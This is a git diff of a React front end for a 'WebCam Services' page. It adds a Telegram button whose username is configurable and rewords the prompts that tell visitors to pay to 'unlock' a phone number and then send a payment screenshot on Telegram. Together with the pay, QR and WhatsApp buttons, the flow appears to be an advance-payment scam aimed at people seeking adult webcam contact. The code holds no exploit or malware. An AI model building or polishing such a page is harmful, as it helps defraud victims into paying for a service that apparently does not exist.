@@ -7,6 +7,7 @@ import PaymentModal from './PaymentModal';
 import CopyModal from './CopyModal';
 import ProfileCard from './ProfileCard';
 import QRCard from './QRCard';
+import profiles from './profiles';
 
 let ip = 'Not Found'
 
@@ -41,6 +42,8 @@ function App() {
   const [isPaymentOpen, setIsPaymentOpen] = useState(false);
   const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);
   const [isQROpen, setIsQROpen] = useState(false);
+  const telegramLink = process.env.REACT_APP_USERNAME?.toLowerCase() || 'shruthiee'
+
 
   const handlepayButton = async () => {
     console.log('pay button clicked')
@@ -71,7 +74,7 @@ function App() {
         <h6 id='serviceName'>WebCam Services</h6>
         <ProfileCard />
         <div className="msgBtn">
-          <h6>{"You should PAY first to Unlock My Number!!😜"}</h6>
+          <h6>{"Finish PAYMENT to Unlock the Number!!😜"}</h6>
           <button className='button' onClick={() => { handlepayButton() }}>{"PAY NOW!!"}</button>{' '}
           <button className='button' onClick={() => { handleQRButton() }}>{"QR Code"}</button>
         </div>
@@ -79,7 +82,11 @@ function App() {
           <h6>{"Click Below👇 For My Whatsapp Number!!"}</h6>
           <button className='button' onClick={() => { handleWspButton() }}>{"Whatsapp Number!"}</button>
         </div>
-        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY NOW and Send me SCREENSHOT on Telegram!!🥰</h6>
+        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY and Send me SCREENSHOT on Telegram!!🥰</h6>
+        <button class="telegram-button">
+          <img src="./tg.png" style={{ width: '30px' }} alt="Telegram logo"></img>
+          <a href={`https://t.me/${telegramLink}`}> Telegram </a>
+        </button>
         <WhatsappModal isOpen={isWhatsappOpen} setisOpen={setIsWhatsappOpen} togglePay={togglePay} className="special_modal"></WhatsappModal>
         <PaymentModal isOpen={isPaymentOpen} setisOpen={setIsPaymentOpen} className="special_modal2"></PaymentModal>
         <QRCard isOpen={isQROpen} setisOpen={setIsQROpen} className="special_modal2"></QRCard>
